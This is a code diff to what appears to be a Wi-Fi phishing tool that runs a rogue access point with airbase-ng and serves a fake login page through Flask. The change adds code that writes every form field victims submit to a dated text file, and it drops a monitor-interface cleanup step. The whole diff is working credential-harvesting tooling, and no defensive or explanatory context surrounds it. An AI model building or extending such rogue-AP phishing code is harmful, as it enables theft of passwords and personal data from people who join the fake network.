@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 
 import subprocess
+import datetime
 import sys
 import time
 import signal
@@ -39,6 +40,11 @@ class Web():
                 for key in data.keys():
                     for value in data.getlist(key):
                         Logger.userinfo("%s : %s" % (key, value))
+                        with open('weefeesher.%s.txt' % str(datetime.date.today()), 'a+') as fd:
+                            fd.write('[%s] %s\n' % (key, value))
+                with open('weefeesher.%s.txt' % str(datetime.date.today()), 'a+') as fd:
+                    fd.write('\n')
+
             return render_template('index.html')
 
         self.app.run('192.168.10.1',80)
@@ -83,8 +89,6 @@ def signal_handler(signal, frame):
     global dns
     Logger.info('Shutting down rogue AP')
     subprocess.call('pkill -9 airbase-ng', shell=True)
-    Logger.info('Deleting monitoring interface')
-    subprocess.call('airmon-ng stop mon0 &> /dev/null', shell=True)
     Logger.info('Up wireless interface')
     subprocess.call('ip link set %s up' % phishing_iface, shell=True)
     subprocess.call('ip link set %s up' % phishing_iface, shell=True)
